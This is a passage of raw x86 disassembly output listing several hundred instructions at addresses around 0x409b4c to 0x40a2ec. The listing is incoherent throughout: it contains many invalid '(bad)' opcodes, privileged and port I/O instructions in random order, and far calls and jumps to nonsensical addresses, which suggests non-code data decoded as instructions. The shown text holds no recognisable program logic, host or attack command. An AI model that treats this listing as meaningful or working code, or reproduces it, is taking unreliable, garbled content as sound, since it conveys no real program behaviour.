  409b4c:	and    bh,BYTE PTR [eax+eax*4]
  409b4f:	ds ja  0x409b5d
  409b52:	stos   BYTE PTR es:[edi],al
  409b53:	cmc    
  409b54:	mov    edx,0xa8166453
  409b59:	inc    ecx
  409b5a:	push   ss
  409b5b:	enter  0x9ad4,0xff
  409b5f:	dec    esi
  409b60:	sti    
  409b61:	iret   
  409b62:	xchg   BYTE PTR [edi*2-0x342d5b1],bl
  409b69:	punpckldq mm0,DWORD PTR [esi-0x44340207]
  409b70:	xor    dl,BYTE PTR [eax+0x26]
  409b73:	dec    edi
  409b74:	cmp    ch,bh
  409b76:	sbb    ch,bh
  409b78:	jecxz  0x409bbc
  409b7a:	mov    eax,ds:0xc2442801
  409b7f:	push   esi
  409b80:	push   0xffffffc5
  409b82:	into   
  409b83:	jle    0x409b49
  409b85:	scas   al,BYTE PTR es:[edi]
  409b86:	sub    BYTE PTR [ebp+ebp*1-0x4],cl
  409b8a:	ds pusha 
  409b8c:	std    
  409b8d:	shl    DWORD PTR [ebp+0x29],0x92
  409b91:	pop    ss
  409b92:	jecxz  0x409bf0
  409b94:	and    BYTE PTR [ebx+edx*1+0x1333f758],ch
  409b9b:	mov    dh,0xd7
  409b9d:	pusha  
  409b9e:	mov    eax,0x6519c631
  409ba3:	(bad)  
  409ba4:	cmp    al,0x4d
  409ba6:	inc    eax
  409ba7:	mov    cl,0x50
  409ba9:	stos   BYTE PTR es:[edi],al
  409baa:	(bad)
  409bad:	jge    0x409b7c
  409baf:	xchg   DWORD PTR [eax],esp
  409bb1:	and    al,0xa2
  409bb3:	outs   dx,BYTE PTR ds:[esi]
  409bb4:	aad    0x37
  409bb6:	push   ebp
  409bb7:	jmp    0x409c19
  409bb9:	push   cs
  409bba:	jnp    0x409b46
  409bbc:	adc    esp,DWORD PTR [ecx+0x2e0a273a]
  409bc2:	ss or  ch,bl
  409bc5:	jo     0x409c3b
  409bc7:	cmp    edi,DWORD PTR [ebx]
  409bc9:	xor    ch,ch
  409bcb:	jp     0x409c37
  409bcd:	inc    eax
  409bce:	cdq    
  409bcf:	rcl    BYTE PTR [eax],1
  409bd1:	push   0x1e8c8ede
  409bd6:	add    BYTE PTR [esi],dl
  409bd8:	adc    al,cl
  409bda:	cmp    eax,0x5273d3de
  409bdf:	mov    cl,0x3b
  409be1:	sbb    DWORD PTR [ebx],ebx
  409be3:	iret   
  409be4:	sub    BYTE PTR [edx+0x52],bh
  409be7:	inc    eax
  409be8:	out    dx,eax
  409be9:	sbb    eax,0x5cd42949
  409bee:	jge    0x409c41
  409bf0:	jne    0x409be2
  409bf2:	cld    
  409bf3:	mov    BYTE PTR [esi+0x6e],dh
  409bf6:	(bad)  
  409bf8:	bound  esi,QWORD PTR [ecx-0x42b6bb96]
  409bfe:	and    eax,esp
  409c00:	sahf   
  409c01:	(bad)  
  409c02:	fsub   st,st(5)
  409c04:	push   cs
  409c05:	fsubr  DWORD PTR [ebp-0x11]
  409c08:	inc    edi
  409c09:	xchg   DWORD PTR [edx],edx
  409c0b:	(bad)  
  409c0c:	xchg   ebp,eax
  409c0d:	mov    ch,0x86
  409c0f:	mov    eax,0x20b552d2
  409c14:	bound  esp,QWORD PTR [esp+ebx*8-0x719bcfb9]
  409c1b:	ins    DWORD PTR es:[edi],dx
  409c1c:	ret    0x73f8
  409c1f:	test   BYTE PTR [eax+eax*4+0x70a499bb],al
  409c26:	xchg   BYTE PTR [ebx+0x5d],dh
  409c29:	or     dh,BYTE PTR [edx-0x6d]
  409c2c:	icebp  
  409c2d:	dec    ebp
  409c2e:	sub    al,0xe
  409c30:	cmp    eax,0x12a2be0d
  409c35:	out    dx,eax
  409c36:	pop    eax
  409c37:	lds    esp,FWORD PTR [edx+0x7e8cb824]
  409c3d:	xchg   BYTE PTR [ebx-0x79],dh
  409c40:	mov    ds:0x9ad7dfbe,al
  409c45:	xchg   esp,eax
  409c46:	sub    DWORD PTR [ebx+ebp*4-0x35],esi
  409c4a:	mov    DWORD PTR [ebx+0x29],ecx
  409c4d:	jg     0x409c17
  409c4f:	jecxz  0x409c8a
  409c51:	fbld   TBYTE PTR [esi+0x73]
  409c54:	call   0x982b9dae
  409c59:	test   eax,0x8e3d57b2
  409c5e:	ret    
  409c5f:	dec    ebp
  409c60:	xchg   edi,eax
  409c61:	mov    esi,0x77af658f
  409c66:	and    ecx,ebp
  409c68:	mov    al,0xe8
  409c6a:	ss pop es
  409c6c:	out    0x1,al
  409c6e:	and    BYTE PTR [ecx],dh
  409c70:	push   cs
  409c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c72:	pop    ebp
  409c73:	push   0xbd7103fa
  409c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c79:	jg     0x409cf6
  409c7b:	retf   0xd729
  409c7e:	or     eax,0xb99d18a2
  409c83:	xor    DWORD PTR [ebx+edx*1-0x26a841],ebx
  409c8a:	(bad)  
  409c8c:	xlat   BYTE PTR ds:[ebx]
  409c8d:	outs   dx,DWORD PTR ds:[esi]
  409c8e:	jo     0x409cad
  409c90:	js     0x409c4b
  409c92:	test   eax,0x324865d5
  409c97:	into   
  409c98:	adc    DWORD PTR [edi-0x15],edx
  409c9b:	mov    edx,DWORD PTR [edi-0x47]
  409c9e:	iret   
  409c9f:	rcr    esp,0x96
  409ca2:	or     eax,0x821a3cfc
  409ca7:	cvtps2pi mm7,xmm4
  409caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cab:	jo     0x409c70
  409cad:	mov    al,ds:0x1e96a1a2
  409cb2:	dec    ebp
  409cb3:	retf   
  409cb4:	sbb    dh,dh
  409cb6:	stc    
  409cb7:	sbb    DWORD PTR [edx+0x6f80110c],edx
  409cbd:	adc    DWORD PTR [edi],edx
  409cbf:	xchg   edi,eax
  409cc0:	push   esp
  409cc1:	int    0x75
  409cc3:	jno    0x409d00
  409cc5:	rol    ebp,1
  409cc7:	ds sub al,0x25
  409cca:	rol    BYTE PTR [edi-0x2deb38a6],cl
  409cd0:	out    dx,al
  409cd1:	fsubrp st(2),st
  409cd3:	inc    ebx
  409cd4:	adc    al,0x6b
  409cd6:	jecxz  0x409cce
  409cd8:	mov    edi,0xf4ff2908
  409cdd:	loope  0x409d0c
  409cdf:	iret   
  409ce0:	push   ebp
  409ce1:	or     eax,DWORD PTR [edi]
  409ce3:	jno    0x409d02
  409ce5:	scas   eax,DWORD PTR es:[edi]
  409ce6:	mov    ebp,0x71832d4d
  409ceb:	ds xor ecx,0x275355b8
  409cf2:	fs mov al,0x45
  409cf5:	mov    edi,0xc9f65b0e
  409cfa:	ret    0xab08
  409cfd:	repnz push edi
  409cff:	into   
  409d00:	jg     0x409cad
  409d02:	cmp    dl,BYTE PTR [edx-0x77]
  409d05:	xor    eax,0x76d8a0a3
  409d0a:	xor    BYTE PTR [eax+eax*1+0x6318e3d2],0xbc
  409d12:	dec    edi
  409d13:	xchg   ebp,eax
  409d14:	add    ebx,esp
  409d16:	out    dx,al
  409d17:	cmc    
  409d18:	popa   
  409d19:	jp     0x409d3a
  409d1b:	std    
  409d1c:	shr    BYTE PTR [ebp+0x2a],1
  409d1f:	iret   
  409d20:	sub    BYTE PTR [esi-0x798021c9],0x6f
  409d27:	mov    dh,0x5e
  409d29:	fstp   TBYTE PTR [ecx]
  409d2b:	jo     0x409d1c
  409d2d:	mov    al,0x99
  409d2f:	dec    esp
  409d30:	into   
  409d31:	add    ah,BYTE PTR [eax+eiz*8-0x602bfbd]
  409d38:	jmp    DWORD PTR [eax+0x34b9db3a]
  409d3e:	aaa    
  409d3f:	leave  
  409d40:	rcl    cl,0x25
  409d43:	mov    edi,0xc0fc8cc6
  409d48:	xor    cl,BYTE PTR [eax-0x25]
  409d4b:	je     0x409cfc
  409d4d:	cmp    bh,cl
  409d4f:	lods   eax,DWORD PTR ds:[esi]
  409d50:	pop    ecx
  409d51:	int3   
  409d52:	push   edi
  409d53:	int3   
  409d54:	pop    es
  409d55:	pop    es
  409d56:	repnz sub bh,BYTE PTR [esi]
  409d59:	js     0x409d2b
  409d5b:	xchg   ebp,eax
  409d5c:	ins    BYTE PTR es:[edi],dx
  409d5d:	inc    esp
  409d5e:	cmc    
  409d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d60:	or     bl,ch
  409d62:	fidivr WORD PTR [ebx-0x7eb9c3c0]
  409d68:	cmp    DWORD PTR [ecx-0x13],0x1eb7192c
  409d6f:	add    bh,ch
  409d71:	adc    eax,0xfe57f341
  409d76:	retf   
  409d77:	dec    esi
  409d78:	adc    BYTE PTR [esi+eiz*2-0x38cc6f1c],0x11
  409d80:	test   BYTE PTR [ebx+esi*8-0x1f],dl
  409d84:	dec    edi
  409d85:	cdq    
  409d86:	push   ebx
  409d87:	inc    DWORD PTR [edi]
  409d89:	fst    DWORD PTR ds:0x6142a9d
  409d8f:	ins    BYTE PTR es:[edi],dx
  409d90:	jmp    0x81a16448
  409d95:	mov    ds:0xe88e4df1,al
  409d9a:	in     al,dx
  409d9b:	jmp    0x409d1e
  409d9d:	stos   DWORD PTR es:[edi],eax
  409d9e:	imul   ebp,DWORD PTR [ebp-0x65035d0a],0x39d45ed0
  409da8:	addr16 mov cl,0x70
  409dab:	dec    ecx
  409dac:	int3   
  409dad:	push   esi
  409dae:	cmp    dl,BYTE PTR [ecx-0x9]
  409db1:	(bad)  
  409db3:	icebp  
  409db4:	jg     0x409e26
  409db6:	repz int 0x51
  409db9:	sub    al,BYTE PTR [eax-0x3f]
  409dbc:	int    0x74
  409dbe:	ret    
  409dbf:	dec    eax
  409dc0:	xchg   ecx,eax
  409dc1:	in     al,dx
  409dc2:	jmp    0x81cc:0x39fe3f28
  409dc9:	lds    esi,FWORD PTR [edx]
  409dcb:	outs   dx,BYTE PTR ds:[esi]
  409dcc:	out    0xa8,eax
  409dce:	mov    cl,0x18
  409dd0:	inc    ecx
  409dd1:	scas   al,BYTE PTR es:[edi]
  409dd2:	xchg   DWORD PTR [esi-0x52e061f6],ebx
  409dd8:	and    BYTE PTR [edi+ebx*8+0x71],bh
  409ddc:	iret   
  409ddd:	jo     0x409d6a
  409ddf:	sub    BYTE PTR [esp+edx*8],0xf6
  409de3:	dec    ebx
  409de4:	daa    
  409de5:	fucom  st(0)
  409de7:	mov    bh,0x31
  409de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dea:	mov    ebx,0x77fc2fef
  409def:	repnz sub DWORD PTR [ebx+ecx*8-0x61ccc4ad],esp
  409df7:	into   
  409df8:	ret    0x48cc
  409dfb:	push   edx
  409dfc:	mov    eax,ds:0x67cc9a12
  409e01:	mov    bh,BYTE PTR [eax]
  409e03:	mov    eax,ds:0xa4f22ce0
  409e08:	mov    bh,0x18
  409e0a:	arpl   WORD PTR [edi+ecx*1+0x7977f8d5],si
  409e11:	aam    0x6b
  409e13:	sbb    cl,BYTE PTR [edi-0x60]
  409e16:	xor    al,0xa6
  409e18:	mov    ch,0xdb
  409e1a:	ffree  st(4)
  409e1c:	push   ds
  409e1d:	popa   
  409e1e:	push   ss
  409e1f:	mov    eax,0x1a06c577
  409e24:	push   ds
  409e25:	push   es
  409e26:	mov    ah,bh
  409e28:	inc    esp
  409e29:	xchg   edi,eax
  409e2a:	aas    
  409e2b:	xor    DWORD PTR [ebx+0x2b],ebx
  409e2e:	retf   
  409e2f:	stc    
  409e30:	xchg   ebx,eax
  409e31:	cmp    eax,0xf2641242
  409e36:	stc    
  409e37:	sbb    eax,0x545c27a0
  409e3c:	dec    ebp
  409e3d:	sti    
  409e3e:	jb     0x409df5
  409e40:	cmc    
  409e41:	(bad)  
  409e42:	out    dx,eax
  409e43:	out    0x48,eax
  409e45:	jecxz  0x409dff
  409e47:	mov    al,0x59
  409e49:	fdivr  DWORD PTR [ecx+0x7]
  409e4c:	push   ds
  409e4d:	ret    0xf864
  409e50:	dec    ebp
  409e51:	and    eax,0xd1d47d4c
  409e56:	test   DWORD PTR [ebx],esi
  409e58:	lods   al,BYTE PTR ds:[esi]
  409e59:	sub    eax,0xd779f718
  409e5e:	outs   dx,BYTE PTR ds:[esi]
  409e5f:	jbe    0x409e8f
  409e61:	retf   0xed8b
  409e64:	pop    es
  409e65:	mov    dl,0x94
  409e67:	pusha  
  409e68:	jmp    0x5c74768c
  409e6d:	xchg   ecx,eax
  409e6e:	mov    dh,0x30
  409e70:	mov    DWORD PTR [edi],ebx
  409e72:	bound  eax,QWORD PTR [ebx+0x5c5d5154]
  409e78:	cmp    BYTE PTR [ecx],0x87
  409e7b:	dec    edx
  409e7c:	jmp    0x409e6d
  409e7e:	and    al,0xc3
  409e80:	cwde   
  409e81:	push   es
  409e82:	fwait
  409e83:	push   ecx
  409e84:	jmp    0x409e32
  409e86:	imul   ebx,DWORD PTR [edi-0x57],0xffffff97
  409e8a:	mov    dh,0x3b
  409e8c:	and    dh,BYTE PTR [ebp-0x66]
  409e8f:	pop    ebp
  409e90:	mov    ds:0xf643fc68,al
  409e95:	repnz pop ebp
  409e97:	push   ss
  409e98:	lds    ebp,FWORD PTR [ecx-0x1a]
  409e9b:	push   cs
  409e9c:	(bad)  
  409e9d:	jns    0x409ec3
  409e9f:	lds    ebx,FWORD PTR [ebx]
  409ea1:	mov    ecx,0x5b5f605
  409ea6:	aas    
  409ea7:	int    0xd1
  409ea9:	fisttp DWORD PTR [esi+0x52005c54]
  409eaf:	cdq    
  409eb0:	or     cl,BYTE PTR [eax]
  409eb2:	jecxz  0x409e64
  409eb4:	xor    ebx,ebx
  409eb6:	out    0xc0,al
  409eb8:	out    0x79,eax
  409eba:	mov    ebx,0x21b60fc2
  409ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ec0:	lock dec esi
  409ec2:	inc    edx
  409ec3:	pop    ebp
  409ec4:	jge    0x409ec0
  409ec6:	(bad)  
  409ec7:	pop    ecx
  409ec8:	xor    edx,eax
  409eca:	dec    ebx
  409ecb:	out    dx,al
  409ecc:	daa    
  409ecd:	adc    BYTE PTR [ebx+0x50bebfea],ah
  409ed3:	xor    eax,0x97934836
  409ed8:	call   FWORD PTR [ecx+0x4c5a5fff]
  409ede:	iret   
  409edf:	cdq    
  409ee0:	clc    
  409ee1:	or     DWORD PTR [edi+0x39b6db3a],0xffffff81
  409ee8:	pop    edi
  409ee9:	ins    BYTE PTR es:[edi],dx
  409eea:	mul    ecx
  409eec:	std    
  409eed:	je     0x409e82
  409eef:	inc    ebp
  409ef0:	push   eax
  409ef1:	jae    0x409ef4
  409ef3:	(bad)
  409ef6:	cmp    DWORD PTR [ebx],0xb0a780ef
  409efc:	aaa    
  409efd:	or     eax,0x2fe0108d
  409f02:	stc    
  409f03:	repnz push ds
  409f05:	adc    DWORD PTR [esp+0x45c017c3],0x20
  409f0d:	call   0xbc350738
  409f12:	dec    eax
  409f13:	xor    eax,0xff076f10
  409f18:	sub    dh,BYTE PTR [esi-0x59915927]
  409f1e:	jge    0x409f62
  409f20:	cmp    ah,cl
  409f22:	dec    ebx
  409f23:	jnp    0x409ea9
  409f25:	sti    
  409f26:	add    BYTE PTR [ebp+edx*2+0x1f],cl
  409f2a:	aas    
  409f2b:	test   DWORD PTR cs:[ecx],edx
  409f2e:	int    0xa
  409f30:	and    ah,BYTE PTR [esi-0x2859f34b]
  409f36:	ffreep st(1)
  409f38:	xor    eax,DWORD PTR [edi]
  409f3a:	shr    ebp,1
  409f3c:	lods   eax,DWORD PTR ds:[esi]
  409f3d:	inc    ebx
  409f3e:	dec    esi
  409f3f:	inc    ah
  409f41:	pop    DWORD PTR [ebx+0x12f1204c]
  409f47:	aad    0x62
  409f49:	into   
  409f4a:	pop    ss
  409f4b:	sub    dh,BYTE PTR [esi+0x15f3a01c]
  409f51:	mov    bl,0xc9
  409f53:	ins    BYTE PTR es:[edi],dx
  409f54:	xor    al,0x14
  409f56:	fwait
  409f57:	adc    al,0x2d
  409f59:	xchg   esi,eax
  409f5a:	dec    eax
  409f5b:	cld    
  409f5c:	cdq    
  409f5d:	pop    edx
  409f5e:	sbb    edi,DWORD PTR [ecx+eiz*4-0x20e66669]
  409f65:	cli    
  409f66:	add    al,ch
  409f68:	mov    ecx,0xb4e75df9
  409f6d:	adc    ebp,DWORD PTR [edi-0x7104f2f1]
  409f73:	add    eax,0x7baa1f94
  409f78:	(bad)
  409f7c:	jecxz  0x409fb8
  409f7e:	jno    0x409f99
  409f80:	jle    0x409f19
  409f82:	mov    esi,0xb7552e79
  409f87:	mov    ebp,0x374a7f82
  409f8c:	mov    WORD PTR [bp-0x7c0c],gs
  409f91:	adc    DWORD PTR [eax+0x53],edi
  409f94:	outs   dx,BYTE PTR ds:[esi]
  409f95:	sti    
  409f96:	xchg   ebp,eax
  409f97:	dec    edx
  409f98:	loop   0x409fdf
  409f9a:	dec    ecx
  409f9b:	call   0x89b9:0x62f3b129
  409fa2:	out    dx,al
  409fa3:	fidiv  DWORD PTR fs:[ecx-0x1dcd6ef0]
  409faa:	add    eax,0x52f5ec4d
  409faf:	push   0x485a18d0
  409fb4:	(bad)  
  409fb5:	rcl    DWORD PTR [edi-0xa9dc10e],1
  409fbb:	inc    BYTE PTR [ebx+0xbafbe3b]
  409fc1:	jl     0x409f5b
  409fc3:	jae    0x409f60
  409fc5:	mov    ebx,0xcfac0da8
  409fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fcb:	ins    DWORD PTR es:[edi],dx
  409fcc:	retf   
  409fcd:	jno    0x409f52
  409fcf:	loop   0x409ffd
  409fd1:	icebp  
  409fd2:	cld    
  409fd3:	jecxz  0x409fe7
  409fd5:	dec    esp
  409fd6:	mov    ah,0x2d
  409fd8:	leave  
  409fd9:	stc    
  409fda:	pop    edx
  409fdb:	pushf  
  409fdc:	in     al,0x29
  409fde:	(bad)  
  409fe0:	xor    eax,0xc34062ae
  409fe5:	lahf   
  409fe6:	out    0x55,al
  409fe8:	mov    cl,0x1b
  409fea:	xor    BYTE PTR [edi+0x3],al
  409fed:	fstp   DWORD PTR [edi+0x6ee6d967]
  409ff3:	aas    
  409ff4:	push   es
  409ff5:	jle    0x409f81
  409ff7:	ins    BYTE PTR es:[edi],dx
  409ff8:	dec    ebx
  409ff9:	xchg   edx,eax
  409ffa:	in     eax,dx
  409ffb:	xlat   BYTE PTR ds:[ebx]
  409ffc:	(bad)  
  409ffd:	(bad)  
  409ffe:	arpl   bx,si
  40a000:	add    al,0x8f
  40a002:	dec    edx
  40a003:	call   0xe51c:0x95fa3060
  40a00a:	cmc    
  40a00b:	mov    cl,0xe6
  40a00d:	in     eax,dx
  40a00e:	mov    ah,0x6
  40a010:	mov    cs:0x84f67576,eax
  40a016:	aad    0x8a
  40a018:	and    al,0x3
  40a01a:	pop    esp
  40a01b:	jno    0x40a064
  40a01d:	dec    ecx
  40a01e:	xchg   edx,eax
  40a01f:	sbb    esi,ebx
  40a021:	sub    DWORD PTR [ebp+0x18],ecx
  40a024:	pusha  
  40a025:	cwde   
  40a026:	adc    BYTE PTR [eax],ch
  40a028:	or     bh,ch
  40a02a:	pop    es
  40a02b:	mov    bh,0x8f
  40a02d:	cs cmp al,0xc9
  40a030:	jo     0x409fe2
  40a032:	inc    ecx
  40a033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a034:	out    0xb,eax
  40a036:	xor    eax,0x94a6ed28
  40a03b:	call   0x518ee457
  40a040:	mov    ds:0xed8a7c18,al
  40a045:	lea    esi,[esi-0x4b7e9993]
  40a04b:	mov    ds:0xaa00dcfb,al
  40a050:	pushf  
  40a051:	ret    
  40a052:	(bad)  [edi+0x442fa818]
  40a058:	mov    ch,0x95
  40a05a:	stos   DWORD PTR es:[edi],eax
  40a05b:	xlat   BYTE PTR ds:[ebx]
  40a05c:	mov    bh,0xf
  40a05e:	mov    dl,0x73
  40a060:	add    bh,BYTE PTR [ebx+0x4bd58332]
  40a066:	xor    al,0xfa
  40a068:	xchg   ecx,eax
  40a069:	mov    al,0x1a
  40a06b:	sbb    bh,cl
  40a06d:	or     al,0xab
  40a06f:	cwde   
  40a070:	inc    ecx
  40a071:	or     BYTE PTR [edx-0x72],bh
  40a074:	add    al,0x8
  40a076:	clc    
  40a077:	mov    cl,0xbe
  40a079:	int3   
  40a07a:	sub    eax,0xb3695aa6
  40a07f:	fist   WORD PTR [esi-0x70]
  40a082:	inc    ecx
  40a083:	mov    ebx,0xf34f0c61
  40a088:	xor    BYTE PTR [edi+ebp*8-0x5fceecb6],0xcc
  40a090:	clc    
  40a091:	pop    ss
  40a092:	lahf   
  40a093:	push   edi
  40a094:	test   eax,0xfa153d78
  40a099:	sub    eax,0xa1ea80b
  40a09e:	sub    eax,0xbd05722b
  40a0a3:	sub    dl,0xf
  40a0a6:	and    esi,0xd7c59323
  40a0ac:	adc    DWORD PTR [eax-0x541d170a],ebx
  40a0b2:	jg     0x40a104
  40a0b4:	jb     0x40a0b0
  40a0b6:	cmp    edi,ebx
  40a0b8:	dec    edx
  40a0b9:	jl     0x40a104
  40a0bb:	mov    ecx,0x741a9757
  40a0c0:	dec    esp
  40a0c1:	jne    0x40a0ed
  40a0c3:	cli    
  40a0c4:	gs out 0x2c,al
  40a0c7:	pop    ss
  40a0c8:	mov    dh,0x19
  40a0ca:	icebp  
  40a0cb:	dec    edx
  40a0cc:	ror    BYTE PTR [ebx+0x5327b79c],1
  40a0d2:	add    ebx,esp
  40a0d4:	mov    esi,0x94d1419c
  40a0d9:	xor    eax,0x6369af91
  40a0de:	loop   0x40a068
  40a0e0:	lea    edi,[eax+0x53]
  40a0e3:	out    0xa4,al
  40a0e5:	ins    BYTE PTR es:[edi],dx
  40a0e6:	jl     0x40a139
  40a0e8:	icebp  
  40a0e9:	lods   eax,DWORD PTR ds:[esi]
  40a0ea:	pop    eax
  40a0eb:	jp     0x40a15f
  40a0ed:	call   0x13adea00
  40a0f2:	out    0x4b,al
  40a0f4:	mov    bl,0x65
  40a0f6:	neg    BYTE PTR [ecx]
  40a0f8:	lock inc eax
  40a0fa:	sub    DWORD PTR [edi+0x22f099e8],esi
  40a100:	xchg   esi,eax
  40a101:	and    bl,ch
  40a103:	cmp    eax,DWORD PTR [eax]
  40a105:	pop    esi
  40a106:	xor    eax,0xbaf98eb9
  40a10b:	out    dx,eax
  40a10c:	cwde   
  40a10d:	xchg   edi,eax
  40a10e:	mov    dh,0x38
  40a110:	or     al,0x52
  40a112:	and    DWORD PTR [ebx+0x6d],esi
  40a115:	xor    al,0x80
  40a117:	xor    eax,0x566c7568
  40a11c:	ja     0x40a19c
  40a11e:	push   ds
  40a11f:	loop   0x40a0e3
  40a121:	push   es
  40a122:	int3   
  40a123:	mov    eax,0x801d928c
  40a128:	cmp    dh,BYTE PTR [edi+0xcd9cb41]
  40a12e:	push   ecx
  40a12f:	retf   
  40a130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a132:	int3   
  40a133:	neg    DWORD PTR [edx-0x5e]
  40a136:	stos   DWORD PTR es:[edi],eax
  40a137:	sbb    esp,DWORD PTR [ebp-0x280741c5]
  40a13d:	ret    0x240f
  40a140:	pop    edx
  40a141:	xor    ch,cl
  40a143:	test   al,0x9f
  40a145:	leave  
  40a146:	mov    bh,cl
  40a148:	repnz push ebp
  40a14a:	xchg   ecx,eax
  40a14b:	retf   0x3f27
  40a14e:	cs pusha 
  40a150:	adc    esp,DWORD PTR [ebx-0x3fa4c418]
  40a156:	adc    al,0xe0
  40a158:	ficomp WORD PTR [edx]
  40a15a:	sbb    DWORD PTR [ebp-0x44],0x32
  40a15e:	xor    esi,DWORD PTR [edx+0x133b7e78]
  40a164:	das    
  40a165:	and    cl,bl
  40a167:	push   eax
  40a168:	adc    BYTE PTR [ebx+0x61],cl
  40a16b:	push   ss
  40a16c:	jecxz  0x40a162
  40a16e:	lahf   
  40a16f:	xchg   ebx,eax
  40a170:	out    dx,al
  40a171:	loope  0x40a1e8
  40a173:	pop    esi
  40a174:	pop    esp
  40a175:	stos   DWORD PTR es:[edi],eax
  40a176:	jns    0x6acc3a9b
  40a17c:	mov    al,cl
  40a17e:	mov    bl,0xfe
  40a180:	sub    dh,BYTE PTR [esi+0x22]
  40a183:	push   edx
  40a184:	xor    al,BYTE PTR [edi-0x39]
  40a187:	jge    0x40a200
  40a189:	retf   0xe247
  40a18c:	pop    es
  40a18d:	call   0xfa98:0xf7feb730
  40a194:	dec    eax
  40a195:	push   ss
  40a196:	test   BYTE PTR [edx+ecx*4-0x70],dl
  40a19a:	pmuludq mm1,QWORD PTR [ecx+ebx*8-0x1032d00f]
  40a1a2:	mov    dh,0x5a
  40a1a4:	jb     0x40a201
  40a1a6:	jns    0x40a177
  40a1a8:	mov    dl,0x7f
  40a1aa:	ins    BYTE PTR es:[edi],dx
  40a1ab:	retf   0x9c37
  40a1ae:	mov    esp,0x4aae8b23
  40a1b3:	and    eax,0x749b3666
  40a1b8:	push   esp
  40a1b9:	test   ch,al
  40a1bb:	mov    ecx,0x8db5cfa5
  40a1c0:	jg     0x40a207
  40a1c2:	(bad)  
  40a1c3:	sar    BYTE PTR [eax-0x48ef1f3d],1
  40a1c9:	sub    DWORD PTR [ebx],eax
  40a1cb:	xor    edx,ebx
  40a1cd:	hlt    
  40a1ce:	shr    BYTE PTR [esi-0x57],cl
  40a1d1:	pop    DWORD PTR [esp+esi*4-0x6eac63b3]
  40a1d8:	and    DWORD PTR [ebx+edi*4],edx
  40a1db:	mov    al,ah
  40a1dd:	inc    eax
  40a1de:	rcl    ah,cl
  40a1e0:	xor    ah,BYTE PTR [eax+0x4]
  40a1e3:	(bad)  
  40a1e4:	jmp    0x40a244
  40a1e6:	dec    ebp
  40a1e7:	xchg   ecx,eax
  40a1e8:	fisttp WORD PTR [esi-0x6c98b287]
  40a1ee:	fild   WORD PTR [esi]
  40a1f0:	xchg   ebx,eax
  40a1f1:	into   
  40a1f2:	inc    ebp
  40a1f3:	and    al,0xe2
  40a1f5:	inc    ecx
  40a1f6:	mov    bh,0xbd
  40a1f8:	pop    eax
  40a1f9:	mov    ch,0xe5
  40a1fb:	push   es
  40a1fc:	test   al,0x2a
  40a1fe:	or     DWORD PTR [edi+ecx*1],0x9d57117
  40a205:	mov    edi,0x48fc28c
  40a20a:	nop
  40a20b:	cmp    edx,DWORD PTR [ecx+edi*4+0x9]
  40a20f:	mov    ecx,0xe0a84c70
  40a214:	loopne 0x40a1c4
  40a216:	sbb    eax,0xcc9074cf
  40a21b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a21c:	mov    edx,DWORD PTR [edx-0x1113cadc]
  40a222:	dec    eax
  40a223:	add    eax,0xfcffd479
  40a228:	or     ah,0x4f
  40a22b:	mov    BYTE PTR [eax],dl
  40a22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22e:	bound  esi,QWORD PTR ds:0x7ae46619
  40a234:	jns    0x40a237
  40a236:	push   ds
  40a237:	mov    ds:0xadda4b37,al
  40a23c:	or     al,0xd3
  40a23e:	dec    esp
  40a23f:	in     eax,dx
  40a240:	mov    eax,ds:0xd0c83d00
  40a245:	mov    ah,dl
  40a247:	fdivr  DWORD PTR [ecx]
  40a249:	lds    esp,FWORD PTR [ebp+0x7f20e6b8]
  40a24f:	data16 jb 0x40a1db
  40a252:	outs   dx,BYTE PTR ds:[esi]
  40a253:	lock es pop ebp
  40a256:	scas   al,BYTE PTR es:[edi]
  40a257:	call   0xe986:0xf541e92
  40a25e:	mov    BYTE PTR [ebx+0x6a6e4ecf],bl
  40a264:	mov    DWORD PTR [edx],ebp
  40a266:	push   0x2f1fe26a
  40a26b:	push   esi
  40a26c:	mov    ecx,0xe8f93b7a
  40a271:	push   cs
  40a272:	push   ebp
  40a273:	dec    eax
  40a274:	in     al,0x94
  40a276:	mov    esp,0xbac574f1
  40a27b:	sbb    ebp,DWORD PTR [ebp+0x45]
  40a27e:	push   ecx
  40a27f:	sbb    DWORD PTR [esi+0x2c4de742],ebx
  40a285:	inc    esp
  40a286:	adc    bl,BYTE PTR [ecx]
  40a288:	push   ss
  40a289:	lea    esi,[ecx+0x208baf78]
  40a28f:	ds mov dh,0xd5
  40a292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a293:	call   0xb35640d4
  40a298:	mov    dl,0xaa
  40a29a:	nop
  40a29b:	and    ecx,ecx
  40a29d:	test   eax,0x25748485
  40a2a2:	mov    edi,0xb96cbfc4
  40a2a7:	cmp    edi,DWORD PTR [edi]
  40a2a9:	mov    ebx,0xd0bb6d38
  40a2ae:	dec    esp
  40a2af:	sar    BYTE PTR [ebx+0x4f414d94],1
  40a2b5:	mov    edi,0xbc40a6e3
  40a2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bc:	pop    ebp
  40a2bd:	fwait
  40a2be:	xchg   esp,edx
  40a2c0:	arpl   WORD PTR cs:[ebx+0x27f1c51f],cx
  40a2c7:	mov    ebx,0xb5309d83
  40a2cc:	popa   
  40a2cd:	cli    
  40a2ce:	sub    al,0xbb
  40a2d0:	or     ebx,ecx
  40a2d2:	cmp    eax,0x9c58af01
  40a2d7:	inc    esi
  40a2d8:	nop
  40a2d9:	(bad)  
  40a2da:	jmp    0x1ff02ba4
  40a2df:	add    ah,BYTE PTR [ebp-0x7d]
  40a2e2:	mov    DWORD PTR [edx-0x1a],esi
  40a2e5:	mov    al,0x39
  40a2e7:	fidivr WORD PTR [edi-0x66]
  40a2ea:	cmp    esp,DWORD PTR [ebx]
  40a2ec:	aas    
